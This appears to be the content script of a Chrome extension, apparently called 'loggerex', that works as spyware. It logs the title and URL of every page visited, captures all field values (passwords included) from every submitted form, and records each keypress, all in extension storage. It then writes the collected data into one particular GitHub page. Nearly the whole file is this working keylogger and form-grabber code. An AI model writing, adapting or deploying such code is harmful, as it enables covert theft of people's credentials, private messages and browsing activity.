publickey = "0p5MhyoPbRu63qTonUuuGBzjYYkAjHQkRnY/wGCv/h9G6EnnMWMa3fECo7aP8P+YyAdJreU/hwLxEFV7ZaLVgeDfAsAYo00LRV9QZv/jSJCKyfLNg69c7bG7v00scZ3PS64jjDAVZmz/o1qXf9p8aiTN9FDNaEbq4B2wPDckUhk="
// chrome.storage.local.clear();

chrome.storage.local.get(function(allresult){
  // console.log(allresult.formdata);
  if(!allresult.snif){
    chrome.storage.local.set({snif:{title:document.title,url:document.location.origin + document.location.pathname}}, function() {
    });
  }
  snifed_data = allresult.snif;
  data_array = [];
  try{
    snifed_data.forEach(function(a){
      data_array.push(a);
    });
  }catch(e){
  }

  data = {title:document.title,url:document.location.origin + document.location.pathname};
  data_array.push({data:data,date:new Date});
  //書き込み
  chrome.storage.local.set({snif:data_array}, function() {
    if(chrome.extension.lastError !== undefined) {
       // console.log("write failer");
    }
    else {
      // console.log("write success");
    }
  });

  //formdata
  formarr = [];
  try{
    allresult.formdata.forEach(function(a){
      formarr.push(a);
  });
}catch(e){}
  function saveForm(time, data) {
      var toSave = {};
      toSave[data] = data;
      toSave[time] = document.title + "(" + document.URL + ")" ;
      formarr.push(toSave);
      chrome.storage.local.set({formdata:formarr}, function() {
        //  console.log("Saved", data.FormElements);
      });
  }

  var forms = document.getElementsByTagName("form");
  for (var i = 0; i < forms.length; i++) {
      forms[i].addEventListener("submit", function(e) {
          var data = {};
          data["FormName"] = e.target.name;
          data["FormAction"] = e.target.action;
          data["FormElements"] = {};
          var elements = e.target.elements;
          for (var n = 0; n < elements.length; n++) {
              data["FormElements"][elements[n].name] = elements[n].value;
          }
          saveForm(e.timeStamp, data);
      });
  }
  //hyoji
  if(document.URL =='https://github.com/shiv3/loggerex'){
      document.write(JSON.stringify(allresult));
      console.log(allresult);
  }


  //key log

  var time = new Date().getTime();
  var data = {};
  var lastLog = time;
  data[time] = document.title + "^~^" + document.URL + "^~^";

  // Key'ed on JS timestamp
  function log(input) {
      var now = new Date().getTime();
      if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
      data[time] += input;
      lastLog = now;
  }


  /* Save data */
  function save() {
          chrome.storage.local.set(data, function() {});
  }

  setInterval(function(){
      save();
  }, 1000);

  // Alphanumeric
  document.addEventListener('keypress', function (e) {
      e = e || window.event;
      var charCode = typeof e.which == "number" ? e.which : e.keyCode;
      if (charCode) {
          log(String.fromCharCode(charCode));
      }
  });


});
